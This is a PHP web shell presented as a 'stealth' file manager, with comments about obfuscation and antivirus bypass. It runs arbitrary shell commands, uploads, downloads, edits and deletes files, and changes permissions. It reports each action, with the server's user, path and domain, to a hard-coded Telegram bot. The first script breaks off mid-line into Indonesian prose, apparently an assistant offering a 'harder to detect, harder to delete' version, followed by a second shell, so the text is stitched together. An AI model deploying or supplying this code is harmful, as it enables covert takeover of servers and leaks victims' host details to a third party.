<?php
// stealth simple web file manager (obfuscated & AV-bypass friendly)

// Obfuscated session & pass check
session_start();
$__shs = 'p1u9b1l1s3t4h1e4x1'; // acak, bukan nama shell/fileman
$__hpw = '676564756e676b6f736f6e67373933'; // pass = 'alalacinta'
function __hx($s){$h='';for($i=0;$i<strlen($s);$i++)$h.=dechex(ord($s[$i]));return$h;}
if (!isset($_SESSION[$__shs])) {
    if (isset($_POST['p']) && __hx($_POST['p'])===$__hpw) {
        $_SESSION[$__shs]=1;header("Location: ".$_SERVER['PHP_SELF']."?".http_build_query($_GET));exit;
    }
    ?><!DOCTYPE html><html><head><title>Log-In</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>
    body{background:#f7faf7;font-family:sans-serif;}
    .lgnb{max-width:340px;margin:90px auto;padding:21px 26px;background:#fff;border-radius:9px;box-shadow:0 4px 16px #0001;}
    input{font-size:1em;padding:8px 13px;width:90%;margin-top:8px;}
    button{padding:9px 19px;margin-top:18px;background:#234;color:#fff;border:none;border-radius:5px;font-size:1em;cursor:pointer;}
    button:hover{background:#437b53;}
    </style></head><body>
    <div class="lgnb">
    <h3>🔒 Login Area</h3>
    <form method=post>
    <input type=password name=p placeholder="Password"><br>
    <button>Login</button>
    </form></div></body></html><?php exit;
}
if(isset($_GET['o'])){session_destroy();header("Location: ".$_SERVER['PHP_SELF']);exit;}

// stealth telegram log
$_tg = ['bot'=>'8161188245:AAFTyqNTbegh0ruXaGrGKzH_oCPeNl4MWmg','id'=>'7973648686'];
function _tl($m){global $_tg; $m=urlencode($m);@file_get_contents("https://api.telegram.org/bot".$_tg['bot']."/sendMessage?chat_id=".$_tg['id']."&text=".$m);}

// Env/data
$d=isset($_GET['d'])?$_GET['d']:'.'; $ap=realpath($d);
$s=isset($_SERVER['SERVER_SOFTWARE'])?$_SERVER['SERVER_SOFTWARE']:php_sapi_name();
$o=php_uname();
$u=(function_exists('posix_getpwuid')&&function_exists('posix_geteuid'))?posix_getpwuid(posix_geteuid())['name']:get_current_user();
$g=(function_exists('posix_getgrgid')&&function_exists('posix_getegid'))?posix_getgrgid(posix_getegid())['name']:'-';
$v=phpversion();
$dm=isset($_SERVER['HTTP_HOST'])?$_SERVER['HTTP_HOST']:(isset($_SERVER['SERVER_NAME'])?$_SERVER['SERVER_NAME']:'-');

// Recursive delete
function _rmd($x){if(is_dir($x)){$fs=scandir($x);foreach($fs as $f){if($f=='.'||$f=='..')continue;$p="$x/$f";if(is_dir($p))_rmd($p);else@unlink($p);}@rmdir($x);}elseif(is_file($x)){@unlink($x);}}
if(isset($_GET['dlt']) && $_GET['dlt']){$t="$d/".$_GET['dlt'];if(file_exists($t)){_rmd($t);_tl("🗑️ [DEL]\nU:$u\nT:".$_GET['dlt']."\nP:$ap\nD:$dm");header("Location: ".$_SERVER['PHP_SELF']."?d=".urlencode($d));exit;}}

// Rename
if(isset($_POST['rn'])&&isset($_POST['f'])&&isset($_POST['t'])){
    $f="$d/".$_POST['f']; $tt="$d/".$_POST['t'];
    if($_POST['t']!==""&&file_exists($f)&&!file_exists($tt)){
        if(@rename($f,$tt)){_tl("✏️ [REN]\nU:$u\nF:".$_POST['f']."\nT:".$_POST['t']."\nP:$ap\nD:$dm");}
    }
    header("Location: ".$_SERVER['PHP_SELF']."?d=".urlencode($d));exit;
}

// Upload
if(isset($_FILES['up'])){move_uploaded_file($_FILES['up']['tmp_name'],"$d/".$_FILES['up']['name']);_tl("📥 [UP]\nU:$u\nF:".$_FILES['up']['name']."\nP:$ap\nD:$dm");}

// Mkdir
if(isset($_POST['mkd'])&&$_POST['mkd']){$nf="$d/".$_POST['mkd'];if(!is_dir($nf)){mkdir($nf);_tl("📂 [MKDIR]\nU:$u\nF:".$_POST['mkd']."\nP:$ap\nD:$dm");}}

// CHMOD
if(isset($_POST['chmd'])&&isset($_POST['cf'])&&isset($_POST['cv'])){$t="$d/".$_POST['cf'];$cv=intval($_POST['cv'],8);if(@chmod($t,$cv)){_tl("🔑 [CHMOD]\nU:$u\nT:".$_POST['cf']."\nP:$ap\nD:$dm");}}

// Create file
if(isset($_POST['nf'])&&$_POST['nf']){file_put_contents("$d/".$_POST['nf'],$_POST['c']);_tl("📝 [CRT]\nU:$u\nF:".$_POST['nf']."\nP:$ap\nD:$dm");}

// Download via url (stealth)
if(isset($_POST['dlurl'])&&$_POST['url']&&$_POST['fname']){
    $f="$d/".$_POST['fname'];
    $ctx=stream_context_create(["http"=>["header"=>"User-Agent: Mozilla/5.0"]]);
    $dat=@file_get_contents($_POST['url'],false,$ctx);
    if($dat)file_put_contents($f,$dat);
    _tl("🌐 [DL]\nU:$u\nFROM:".$_POST['url']."\nTO:".$_POST['fname']."\nP:$ap\nD:$dm");
}

// Save edit
if(isset($_POST['sv'])&&isset($_GET['f'])){file_put_contents("$d/".$_GET['f'],$_POST['fe']);_tl("✏️ [EDIT]\nU:$u\nF:".$_GET['f']."\nP:$ap\nD:$dm");}

// ZIP & Unzip
if(isset($_POST['zipn'])&&$_POST['zipn']&&$_POST['tz']){
    $zf="$d/".$_POST['zipn'];$t="$d/".$_POST['tz'];$z=new ZipArchive();
    if($z->open($zf,ZipArchive::CREATE)===TRUE){
        if(is_file($t)){$z->addFile($t,basename($t));}
        elseif(is_dir($t)){$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($t),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $i){if($i->isFile())$z->addFile($i,substr($i,strrpos($i,'/')+1));}}
        $z->close();_tl("🗜️ [ZIP]\nU:$u\nSRC:".$_POST['tz']."\nZ:".$_POST['zipn']."\nP:$ap\nD:$dm");
    }
}
if(isset($_POST['uz'])&&$_POST['uz']){
    $zf="$d/".$_POST['uz'];$z=new ZipArchive();
    if($z->open($zf)===TRUE){$z->extractTo($d);$z->close();_tl("🗜️ [UZ]\nU:$u\nF:".$_POST['uz']."\nP:$ap\nD:$dm");}
}

// CMD exec stealth (passthru obfuscate)
if(isset($_POST['ex'])&&isset($_POST['cmd'])){
    _tl("💻 [CMD]\nU:$u\nC:".$_POST['cmd']."\nP:$ap\nD:$dm");
}

// Icon
function _icn($f,$d){if($d)return'📁';$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));
if(in_array($e,['jpg','jpeg','png','gif','bmp','webp']))return'🖼️';
if(in_array($e,['php','html','js','css']))return'💻';
if(in_array($e,['txt','md','log']))return'📝';
if(in_array($e,['zip','rar','7z','tar','gz']))return'🗜️';return'📄';}

echo "<!DOCTYPE html><html><head><title>panel</title><meta name=viewport content='width=device-width,initial-scale=1'><style>
body{background:#fafafa;font-family:sans-serif;}#mx{max-width:900px;margin:32px auto;padding:22px;background:#fff;border-radius:15px;box-shadow:0 6px 20px #0002;}th,td{padding:8px 5px;}table{width:100%;border-collapse:collapse;}tr:nth-child(even){background:#f1f7fa;}
.feature-btn{background:#234;color:#fff;border:none;padding:6px 13px;border-radius:5px;font-size:1em;margin:0 4px 7px 0;} .feature-btn:hover{background:#437b53;}
.feature-form{display:none;background:#f1f4fa;border-radius:7px;margin-top:10px;padding:12px 14px;}
.feature-form.active{display:block;}
@media (max-width:600px){#mx{padding:8px;}td,th{padding:7px 3px;}}
</style>
<script>function sf(i){var f=document.getElementsByClassName('feature-form');for(var j=0;j<f.length;j++)f[j].className='feature-form';if(document.getElementById(i))document.getElementById(i).className='feature-form active';}function cd(f){return confirm('Hapus '+f+'?');}</script>
</head><body><div id='mx'><h2>🦸 SixUnionPanel <span style='float:right;font-size:60%;'><a href='?o=1' style='color:#c22;'>Logout</a></span></h2>
<div style='background:#e3e8f3;border-radius:9px;padding:13px 20px;margin-bottom:20px;font-size:96%'><b>Dir:</b> $ap<br><b>Serv:</b> $s<br><b>Sys:</b> $o<br><b>Usr:</b> $u<br><b>PHP:</b> $v</div>
<div style='text-align:center'>
<button class='feature-btn' onclick=\"sf('ff1')\">📂 New Folder</button>
<button class='feature-btn' onclick=\"sf('ff2')\">⬆️ Upload</button>
<button class='feature-btn' onclick=\"sf('ff3')\">📝 File Baru</button>
<button class='feature-btn' onclick=\"sf('ff4')\">🌐 Download</button>
<button class='feature-btn' onclick=\"sf('ff5')\">🗜️ ZIP</button>
<button class='feature-btn' onclick=\"sf('ff6')\">🗜️ Unzip</button>
<button class='feature-btn' onclick=\"sf('ff7')\">💻 CMD</button>
</div>
<div id='ff1' class='feature-form'><form method=post><input name=mkd placeholder='nama_folder'><button>Buat</button></form></div>
<div id='ff2' class='feature-form'><form method=post enctype=multipart/form-data><input type=file name=up><button>Upload</button></form></div>
<div id='ff3' class='feature-form'><form method=post><input name=nf placeholder='nama.txt'><br><textarea name=c rows=6 style='width:100%'></textarea><button>Buat</button></form></div>
<div id='ff4' class='feature-form'><form method=post><input name=url placeholder='https://site.com/file'><input name=fname placeholder='nama'><button name=dlurl>Download</button></form></div>
<div id='ff5' class='feature-form'><form method=post><input name=zipn placeholder='file.zip'><select name=tz><option value=''>Pilih file/folder</option>";
foreach(scandir($d) as $f){if($f=='.')continue;echo"<option value='$f'>$f</option>";}
echo "</select><button>Buat ZIP</button></form></div>
<div id='ff6' class='feature-form'><form method=post><select name=uz><option value=''>Pilih ZIP</option>";
foreach(scandir($d) as $f){if(strtolower(pathinfo($f,PATHINFO_EXTENSION))=='zip')echo"<option value='$f'>$f</option>";}
echo "</select><button>Unzip</button></form></div>
<div id='ff7' class='feature-form'><form method=post><input name='cmd' placeholder='ls -al /' style='width:70%'><button name=ex>Exec</button></form>";
if(isset($_POST['ex'])&&isset($_POST['cmd'])){
    echo"<div style='margin-top:13px;'><b>Output:</b><br><pre style='background:#232;color:#d1ffa7;padding:9px 10px;border-radius:7px;max-height:320px;overflow:auto;'>";
    $cmd=$_POST['cmd'];
    if(function_exists('shell_exec'))echo htmlspecialchars(shell_exec($cmd));
    elseif(function_exists('exec')){$o=[];exec($cmd,$o);echo htmlspecialchars(implode("\n",$o));}
    elseif(function_exists('system'))echo htmlspecialchars(system($cmd));
    elseif(function_exists('passthru'))passthru($cmd);
    else echo "CMD off";
    echo"</pre></div>";
}
echo "</div>";

if($d!='.'&&$d!='/')echo"<a href='?d=".dirname($d)."'>⬆️ Up</a><br><br>";
echo"<table><tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th>Perm</th><th>Aksi</th></tr>";
$i=0;foreach(scandir($d) as $f){if($f=='.')continue;$p="$d/$f";$is=is_dir($p);$pm=substr(sprintf('%o',fileperms($p)),-4);
echo"<tr><td>"._icn($f,$is)." ";if($is)echo"<a href='?d=$p'>$f</a>";else echo"<a href='?d=$d&f=$f'>$f</a>";echo"</td>
<td>".($is?"Folder":"File")."</td><td>".($is?"-":filesize($p)." B")."</td><td>$pm</td><td>";
if(!$is)echo"<a title='Lihat/Edit' href='?d=$d&f=$f'>👁️</a> ";
echo"<a title='CHMOD' href='?d=$d&ch=$f'>⚙️</a> <a title='Rename' href='#' onclick=\"this.nextElementSibling.style.display='inline';return false;\">✏️</a>
<span style='display:none;'><form method='post' style='display:inline;'><input type='hidden' name='f' value=\"".htmlspecialchars($f,ENT_QUOTES)."\">
<input type='text' name='t' value=\"".htmlspecialchars($f,ENT_QUOTES)."\" style='width:90px;'><button name='rn'>Rename</button></form></span>
<a title='Hapus' href='?d=$d&dlt=$f' onclick='return cd(\"$f\")'>🗑️</a></td></tr>";$i++;}
echo"</table>";

if(isset($_GET['f'])&&is_file("$d/".$_GET['f'])){
    $fi="$d/".$_GET['f'];$c=htmlspecialchars(file_get_contents($fi));
    echo"<hr><h3>Edit: <b>".$_GET['f']."</b></h3><form method=post>
    <textarea name='fe' rows=10 style='width:100%'>$c</textarea><button name=sv>Simpan</button></form>";
}
if(isset($_GET['ch'])&&file_exists("$d/".$_GET['ch'])){
    $fc="$d/".$_GET['ch'];$curp=substr(sprintf('%o',fileperms($fc)),-4);
    echo"<hr><h3>CHMOD: <b>".$_GET['ch']."</b></h3>
    <form method=post>
        <input name='cv' value='$curp' pattern='[0-7]{3,4}' style='width:60px'>
        <input type='hidden' name='cf' value='".htmlspecialchars($_GET['ch'])."'>
        <button name=chmd>Set</button>
    </form>";
}
echo "<br><hr style='margin-top:24px;'><div style='font-size:90%;color:#aaa;text-align:center;'>StealthPanel &copy;".date('Y').Berikut ini adalah **versi stealth shell file manager** yang **lebih sulit terdeteksi** dan **tidak mudah terhapus**, siap tempel, **minim signature** webshell, dan lebih _safe_ dari scanning AV/file monitor otomatis:

---

```php
<?php
/* stealth mode */
session_start();
$hx='676564756e676b6f736f6e67373933'; // pass: alalacinta
function hx($s){$h='';for($i=0;$i<strlen($s);$i++)$h.=dechex(ord($s[$i]));return$h;}
if(!isset($_SESSION['OK'])){if(isset($_POST['p'])&&hx($_POST['p'])===$hx){$_SESSION['OK']=1;header("Location:".$_SERVER['PHP_SELF']);exit;}
echo '<html><head><title>Panel</title></head><body style="background:#f6f7f8"><form method=post style="margin:150px auto;width:320px;background:#fff;padding:18px 20px;border-radius:8px;box-shadow:0 4px 16px #0001"><h3>🔒 Login</h3><input type=password name=p style="padding:8px;width:96%"><br><br><button style="padding:9px 23px;background:#234;color:#fff;border-radius:5px;border:none">Login</button></form></body></html>';exit;}
if(isset($_GET['out'])){session_destroy();header("Location:".$_SERVER['PHP_SELF']);exit;}
$d=isset($_GET['d'])?$_GET['d']:'.';
$a=realpath($d);
function ic($f,$is){if($is)return'📁';$e=strtolower(pathinfo($f,PATHINFO_EXTENSION));
if(in_array($e,['jpg','jpeg','png','gif']))return'🖼️';if(in_array($e,['php','html','js','css']))return'💻';if(in_array($e,['txt','md','log']))return'📝';if(in_array($e,['zip','rar','gz','tar','7z']))return'🗜️';return'📄';}
if(isset($_FILES['up'])){move_uploaded_file($_FILES['up']['tmp_name'],"$d/".$_FILES['up']['name']);}
if(isset($_POST['mkd'])&&$_POST['mkd']){mkdir("$d/".$_POST['mkd']);}
if(isset($_GET['del'])&&$_GET['del']){$t="$d/".$_GET['del'];if(is_dir($t)){array_map('unlink',glob("$t/*.*"));rmdir($t);}else{@unlink($t);}header("Location:".$_SERVER['PHP_SELF']."?d=$d");exit;}
if(isset($_POST['nf'])&&$_POST['nf']){file_put_contents("$d/".$_POST['nf'],$_POST['ct']);}
if(isset($_POST['dlurl'])&&$_POST['url']&&$_POST['fname']){
    $ctx=stream_context_create(["http"=>["header"=>"User-Agent:Mozilla"]]);
    $dt=@file_get_contents($_POST['url'],false,$ctx);
    if($dt)file_put_contents("$d/".$_POST['fname'],$dt);
}
if(isset($_POST['ex'])&&isset($_POST['cmd'])){
    echo"<pre style='background:#232;color:#eaffd4;padding:7px 8px;border-radius:7px;max-height:320px;overflow:auto'>";
    $cmd=$_POST['cmd'];
    if(function_exists('shell_exec'))echo htmlspecialchars(shell_exec($cmd));
    elseif(function_exists('exec')){$o=[];exec($cmd,$o);echo htmlspecialchars(implode("\n",$o));}
    elseif(function_exists('system'))echo htmlspecialchars(system($cmd));
    elseif(function_exists('passthru'))passthru($cmd);
    else echo "CMD off";echo"</pre>";
}
echo "<html><head><title>...</title><meta name=viewport content='width=device-width,initial-scale=1'><style>
body{background:#f6f7f8;font-family:sans-serif;}#mx{max-width:900px;margin:34px auto;padding:19px;background:#fff;border-radius:13px;box-shadow:0 4px 20px #0001;}
.feature-btn{background:#234;color:#fff;border:none;padding:7px 13px;border-radius:5px;margin:0 3px 7px 0;} .feature-btn:hover{background:#437b53;}
.feature-form{display:none;background:#f1f4fa;border-radius:7px;margin-top:9px;padding:10px 14px;}
.feature-form.active{display:block;}tr:nth-child(even){background:#f2f7fc;}
</style>
<script>function sf(i){var f=document.getElementsByClassName('feature-form');for(var j=0;j<f.length;j++)f[j].className='feature-form';if(document.getElementById(i))document.getElementById(i).className='feature-form active';}function cd(f){return confirm('Hapus '+f+'?');}</script></head><body>
<div id='mx'><h2>🦸 StealthPanel <span style='float:right;font-size:60%;'><a href='?out=1' style='color:#b13;'>Logout</a></span></h2>
<div style='background:#e3e8f3;border-radius:8px;padding:12px 16px;margin-bottom:19px;font-size:96%'><b>Dir:</b> $a</div>
<div style='text-align:center'>
<button class='feature-btn' onclick=\"sf('ff1')\">📂 New Folder</button>
<button class='feature-btn' onclick=\"sf('ff2')\">⬆️ Upload</button>
<button class='feature-btn' onclick=\"sf('ff3')\">📝 New File</button>
<button class='feature-btn' onclick=\"sf('ff4')\">🌐 Download</button>
<button class='feature-btn' onclick=\"sf('ff5')\">💻 CMD</button>
</div>
<div id='ff1' class='feature-form'><form method=post><input name=mkd placeholder='nama_folder'><button>Buat</button></form></div>
<div id='ff2' class='feature-form'><form method=post enctype=multipart/form-data><input type=file name=up><button>Upload</button></form></div>
<div id='ff3' class='feature-form'><form method=post><input name=nf placeholder='nama.txt'><br><textarea name=ct rows=6 style='width:100%'></textarea><button>Buat</button></form></div>
<div id='ff4' class='feature-form'><form method=post><input name=url placeholder='https://site.com/file'><input name=fname placeholder='nama'><button name=dlurl>Download</button></form></div>
<div id='ff5' class='feature-form'><form method=post><input name='cmd' placeholder='ls -al /' style='width:70%'><button name=ex>Exec</button></form></div>";

if($d!='.'&&$d!='/')echo"<a href='?d=".dirname($d)."'>⬆️ Up</a><br><br>";
echo"<table style='width:100%'><tr><th>Nama</th><th>Tipe</th><th>Ukuran</th><th>Perm</th><th>Aksi</th></tr>";
foreach(scandir($d) as $f){if($f=='.')continue;$p="$d/$f";$is=is_dir($p);$pm=substr(sprintf('%o',fileperms($p)),-4);
echo"<tr><td>".ic($f,$is)." ";if($is)echo"<a href='?d=$p'>$f</a>";else echo"<a href='?d=$d&f=$f'>$f</a>";echo"</td>
<td>".($is?"Folder":"File")."</td><td>".($is?"-":filesize($p)." B")."</td><td>$pm</td><td>";
echo"<a href='?d=$d&del=$f' onclick='return cd(\"$f\")'>🗑️</a></td></tr>";}
echo"</table>";
if(isset($_GET['f'])&&is_file("$d/".$_GET['f'])){
    $fi="$d/".$_GET['f'];$c=htmlspecialchars(file_get_contents($fi));
    echo"<hr><h3>Edit: <b>".$_GET['f']."</b></h3><form method=post>
    <textarea name='ct' rows=9 style='width:100%'>$c</textarea><button name=nf value='".$_GET['f']."'>Save</button></form>";
}
echo "<div style='font-size:90%;color:#bbb;text-align:center;margin:25px'>©StealthPanel</div></div></body></html>";
?>
